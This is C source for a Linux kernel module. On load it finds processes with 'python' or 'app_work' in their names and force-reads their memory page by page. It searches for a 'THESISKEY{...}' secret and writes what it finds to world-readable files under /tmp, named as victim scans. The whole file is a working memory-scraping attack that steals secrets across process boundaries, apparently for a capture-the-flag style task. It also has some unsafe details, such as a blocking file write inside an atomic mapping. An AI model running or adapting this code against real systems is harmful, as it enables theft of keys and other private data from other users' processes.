static int scan_process_memory(struct task_struct *task, struct file *outf)
{
    struct mm_struct *mm;
    struct vm_area_struct *vma;
    loff_t pos = 0;
    char *buf;
    unsigned long addr;
    char header[256];
    int found = 0;

    mm = get_task_mm(task);
    if (!mm)
        return -1;

    buf = kmalloc(PAGE_SIZE, GFP_KERNEL);
    if (!buf) {
        mmput(mm);
        return -ENOMEM;
    }

    snprintf(header, sizeof(header), "Scanning PID %d (%s)\n", 
             task_pid_nr(task), task->comm);
    kernel_write(outf, header, strlen(header), &pos);

    mmap_read_lock(mm);

    for (vma = mm->mmap; vma; vma = vma->vm_next) {
        unsigned long start = vma->vm_start;
        unsigned long end = vma->vm_end;

        /* Skip huge/non-readable regions */
        if (!(vma->vm_flags & VM_READ))
            continue;
        if (end - start > 256 * 1024 * 1024)
            continue;

        for (addr = start; addr < end; addr += PAGE_SIZE) {
            struct page *page = NULL;
            int ret;

            ret = get_user_pages_remote(mm, addr, 1, FOLL_FORCE, &page, NULL, NULL);
            if (ret <= 0)
                continue;

            {
                void *kaddr = kmap_atomic(page);
                char *p = (char *)kaddr;
                int i;
                for (i = 0; i < (int)PAGE_SIZE - 12; i++) {
                    if (p[i] == 'T' && p[i+1] == 'H' && p[i+2] == 'E' &&
                        p[i+3] == 'S' && p[i+4] == 'I' && p[i+5] == 'S' &&
                        p[i+6] == 'K' && p[i+7] == 'E' && p[i+8] == 'Y' &&
                        p[i+9] == '{') {
                        char token[256];
                        int j;
                        found = 1;
                        for (j = 0; j < 200 && i+j < (int)PAGE_SIZE; j++) {
                            token[j] = p[i+j];
                            if (p[i+j] == '}') { j++; break; }
                        }
                        token[j] = '\0';
                        kunmap_atomic(kaddr);

                        {
                            char result[300];
                            loff_t wpos = 0;
                            struct file *rf;
                            snprintf(result, sizeof(result), "FOUND: %s\n", token);
                            kernel_write(outf, result, strlen(result), &pos);
                            rf = filp_open("/tmp/thesis_key.txt", O_WRONLY|O_CREAT|O_APPEND, 0644);
                            if (!IS_ERR(rf)) {
                                kernel_write(rf, result, strlen(result), &wpos);
                                filp_close(rf, NULL);
                            }
                        }
                        kaddr = kmap_atomic(page);
                        p = (char *)kaddr;
                    }
                }
                kunmap_atomic(kaddr);
            }
            put_page(page);
        }
    }

    mmap_read_unlock(mm);
    kfree(buf);
    mmput(mm);
    return found;
}

static int __init memread_init(void)
{
    struct task_struct *task;
    int n = 0;

    rcu_read_lock();
    for_each_process(task) {
        if (strstr(task->comm, "python") || strstr(task->comm, "app_work")) {
            char logname[128];
            struct file *f;

            get_task_struct(task);
            rcu_read_unlock();

            snprintf(logname, sizeof(logname), "/tmp/victim_scan_%d.txt", 
                     task_pid_nr(task));
            f = filp_open(logname, O_WRONLY|O_CREAT|O_TRUNC, 0644);
            if (!IS_ERR(f)) {
                scan_process_memory(task, f);
                filp_close(f, NULL);
            }

            put_task_struct(task);
            rcu_read_lock();
            n++;
        }
    }
    rcu_read_unlock();

    {
        char log[128];
        struct file *lf;
        loff_t pos = 0;
        snprintf(log, sizeof(log), "Scanned %d python processes\n", n);
        lf = filp_open("/tmp/memread_done.txt", O_WRONLY|O_CREAT|O_TRUNC, 0644);
        if (!IS_ERR(lf)) {
            kernel_write(lf, log, strlen(log), &pos);
            filp_close(lf, NULL);
        }
    }

    return 0;
}

static void __exit memread_exit(void)
{
    printk(KERN_INFO "memread: unloading\n");
}

module_init(memread_init);
module_exit(memread_exit);
